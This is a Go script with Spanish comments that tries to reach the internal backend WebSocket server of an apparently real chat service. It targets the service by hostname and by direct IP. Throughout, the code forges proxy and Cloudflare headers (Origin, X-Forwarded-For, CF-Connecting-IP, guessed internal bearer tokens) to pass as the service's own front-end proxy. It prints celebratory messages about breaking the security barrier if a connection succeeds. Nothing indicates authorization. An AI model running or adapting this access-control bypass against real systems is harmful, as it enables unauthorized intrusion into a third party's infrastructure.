package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

func testInternalConnection(wsURL, cloudflareIP string) error {
	fmt.Printf("\n🔌 Probando: %s\n", wsURL)
	fmt.Printf("📡 Simulando conexión interna desde ws03 vía Cloudflare IP: %s\n", cloudflareIP)

	// Headers simulando que somos el proxy interno ws03.dalechatea.me
	headers := http.Header{}

	// CLAVE: Simular que venimos desde ws03, no desde usuario final
	headers.Set("Origin", "https://ws03.dalechatea.me")   // Origen = ws03
	headers.Set("Referer", "https://ws03.dalechatea.me/") // Referer = ws03
	headers.Set("Host", "wss.dalechatea.me")              // Host destino

	// Headers de proxy interno - ws03 reenviando a backend
	headers.Set("X-Forwarded-For", "200.223.222.222, "+cloudflareIP+", 104.26.14.97") // Usuario + CF + ws03
	headers.Set("X-Real-IP", cloudflareIP)                                            // IP real = Cloudflare
	headers.Set("X-Forwarded-Proto", "https")
	headers.Set("X-Forwarded-Host", "ws03.dalechatea.me")   // Host original = ws03
	headers.Set("X-Forwarded-Server", "ws03.dalechatea.me") // Servidor que reenvía

	// Cliente final simulado
	headers.Set("CF-Connecting-IP", "200.223.222.222") // IP del usuario final
	headers.Set("True-Client-IP", "200.223.222.222")

	// Headers de Cloudflare que ws03 recibiría y reenviara
	headers.Set("CF-Ray", "8a1b2c3d4e5f6789-EZE")
	headers.Set("CF-IPCountry", "AR")
	headers.Set("CF-Visitor", `{"scheme":"https"}`)
	headers.Set("CDN-Loop", "cloudflare")
	headers.Set("CF-Request-ID", "01234567890abcdef")

	// Headers de proxy interno/load balancer
	headers.Set("X-Proxy-Authorization", "internal")
	headers.Set("X-Internal-Request", "true")
	headers.Set("X-Upstream-Server", "ws03.dalechatea.me")
	headers.Set("X-Backend-Request", "websocket")

	// Simular User-Agent de ws03 como proxy
	headers.Set("User-Agent", "ws03-proxy/1.0 (internal)")

	// Headers de autenticación interna (adivinanzas educadas)
	headers.Set("X-Internal-Auth", "ws03-backend")
	headers.Set("X-Proxy-Token", "ws03-internal-token")
	headers.Set("Authorization", "Bearer ws03-internal")

	// Via headers mostrando el camino: Usuario -> Cloudflare -> ws03 -> backend
	headers.Set("Via", "1.1 cloudflare, 1.1 ws03.dalechatea.me")
	headers.Set("X-Via", "cloudflare -> ws03 -> backend")

	// Headers de SSL/TLS para conexión interna
	headers.Set("X-SSL-Client-Verify", "SUCCESS")
	headers.Set("X-SSL-Client-S-DN", "CN=ws03.dalechatea.me")
	headers.Set("X-Forwarded-SSL", "on")

	// Configurar dialer
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
	}

	// Si es conexión por IP, configurar TLS
	if strings.Contains(wsURL, "51.161.13.145") {
		dialer.TLSClientConfig = &tls.Config{
			ServerName: "wss.dalechatea.me",
		}
	}

	// Intentar conexión
	fmt.Println("🔄 Intentando conexión con headers de proxy interno...")
	conn, resp, err := dialer.Dial(wsURL, headers)
	if err != nil {
		if resp != nil {
			fmt.Printf("❌ Error: %v (Status: %d)\n", err, resp.StatusCode)
			fmt.Println("   Headers de respuesta relevantes:")
			for key, values := range resp.Header {
				if strings.HasPrefix(strings.ToLower(key), "cf-") ||
					strings.HasPrefix(strings.ToLower(key), "x-") ||
					key == "Server" || key == "WWW-Authenticate" {
					for _, value := range values {
						fmt.Printf("     %s: %s\n", key, value)
					}
				}
			}
		} else {
			fmt.Printf("❌ Error: %v\n", err)
		}
		return err
	}
	defer conn.Close()

	fmt.Println("✅ ¡¡¡CONEXIÓN EXITOSA!!! 🎉")
	fmt.Println("🎊 ¡LOGRAMOS ACCEDER AL SERVIDOR BACKEND!")

	// Leer mensajes
	messageCount := 0
	timeout := time.After(5 * time.Second)

readLoop:
	for {
		select {
		case <-timeout:
			break readLoop
		default:
			conn.SetReadDeadline(time.Now().Add(time.Second))
			_, message, err := conn.ReadMessage()
			if err != nil {
				if !strings.Contains(err.Error(), "timeout") {
					fmt.Printf("Error leyendo: %v\n", err)
				}
				break readLoop
			}
			messageCount++
			fmt.Printf("📨 Mensaje %d: %s\n", messageCount, string(message))
			if messageCount >= 3 {
				break readLoop
			}
		}
	}

	// Cerrar limpiamente
	conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))

	return nil
}

func main2() {
	fmt.Println("🎯 PRUEBA FINAL: Simulando conexión interna ws03 -> backend")
	fmt.Println("========================================================")
	fmt.Println("Estrategia: Simular que somos ws03.dalechatea.me conectando al backend")

	// IPs de Cloudflare para probar
	cloudflareIPs := []string{
		"104.26.14.97",   // IP vista en logs del chat
		"104.16.133.229", // IP de cloudflare.com
		"172.64.0.1",     // Rango típico CF
	}

	// Servidores backend a probar
	backendServers := []string{
		"wss://wss.dalechatea.me:1239/", // Por hostname
		"wss://51.161.13.145:1239/",     // Por IP directa
	}

	successCount := 0
	totalTests := 0

	for _, server := range backendServers {
		fmt.Printf("\n🎯 === PROBANDO SERVIDOR: %s ===\n", server)

		for i, cfIP := range cloudflareIPs {
			totalTests++
			fmt.Printf("\n--- Intento %d/%d (IP CF: %s) ---", i+1, len(cloudflareIPs), cfIP)

			err := testInternalConnection(server, cfIP)
			if err == nil {
				successCount++
				fmt.Printf("\n🎉 ¡¡¡ÉXITO HISTÓRICO!!! Servidor: %s con IP CF: %s\n", server, cfIP)
				fmt.Println("🚨 ¡ROMPIMOS LA BARRERA DE SEGURIDAD!")

				// Si logramos una conexión exitosa, registramos el método
				fmt.Println("\n📝 MÉTODO EXITOSO:")
				fmt.Printf("   Servidor: %s\n", server)
				fmt.Printf("   IP CF: %s\n", cfIP)
				fmt.Println("   Headers clave: Origin=ws03.dalechatea.me, X-Forwarded-Server=ws03.dalechatea.me")
			}

			// Pausa entre intentos
			if i < len(cloudflareIPs)-1 {
				time.Sleep(2 * time.Second)
			}
		}
	}

	fmt.Printf("\n\n=== 🏁 RESULTADOS FINALES ===\n")
	fmt.Printf("Conexiones exitosas: %d/%d\n", successCount, totalTests)

	if successCount > 0 {
		fmt.Println("\n🎊 ¡¡¡MISIÓN CUMPLIDA!!!")
		fmt.Println("✨ Logramos conectar al servidor backend simulando tráfico interno")
		fmt.Println("🔓 El método de autenticación fue descifrado exitosamente")
	} else {
		fmt.Println("\n🔒 RESULTADO: El servidor backend sigue inaccesible")
		fmt.Println("💡 Conclusión: La autenticación va más allá de headers HTTP")
		fmt.Println("   Posibles mecanismos adicionales:")
		fmt.Println("   ▪ Certificados SSL de cliente específicos")
		fmt.Println("   ▪ Túneles VPN internos")
		fmt.Println("   ▪ Autenticación a nivel de infraestructura de red")
		fmt.Println("   ▪ Verificación de origen por métodos no simulables")
		fmt.Println("\n🎯 RECOMENDACIÓN: Usar ws03.dalechatea.me como endpoint definitivo")
	}
}
